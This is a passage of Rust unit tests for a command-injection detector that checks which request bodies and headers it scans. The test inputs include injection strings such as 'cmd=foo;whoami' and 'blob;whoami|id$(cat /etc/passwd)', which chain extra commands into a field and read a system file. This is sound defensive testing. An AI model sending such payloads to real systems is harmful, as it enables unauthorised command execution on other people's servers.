        let mut h = http::HeaderMap::new();
        if let Some(ct) = ct {
            h.insert("content-type", ct.parse().unwrap());
        }
        (
            http::Method::POST,
            "/api/run".parse().unwrap(),
            h,
            BodyPeek::new(body.as_bytes().to_vec(), Some(body.len() as u64), false),
        )
    }

    #[test]
    fn body_scanned_when_form_urlencoded() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = body_view(Some("application/x-www-form-urlencoded"), "cmd=foo;whoami");
        let req = make_view(&m, &u, &h, &b);
        assert!(!d.inspect(&req).is_empty(), "form body cmdi must fire");
    }

    #[test]
    fn body_skipped_when_octet_stream() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = body_view(Some("application/octet-stream"), "blob;whoami|id$(cat /etc/passwd)");
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).is_empty(), "binary beacon body must be skipped");
    }

    // Baseline cmdi in a cookie must NOT fire (headers are log4shell-only);
    // a Log4Shell cookie still fires — see `log4shell_cookie_header_blocks`.
    #[test]
    fn baseline_cmdi_in_cookie_not_scanned() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let mut h = http::HeaderMap::new();
        h.insert("cookie", "sid=abc;whoami".parse().unwrap());
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).is_empty(), "baseline cmdi in cookie must not fire");
    }
}
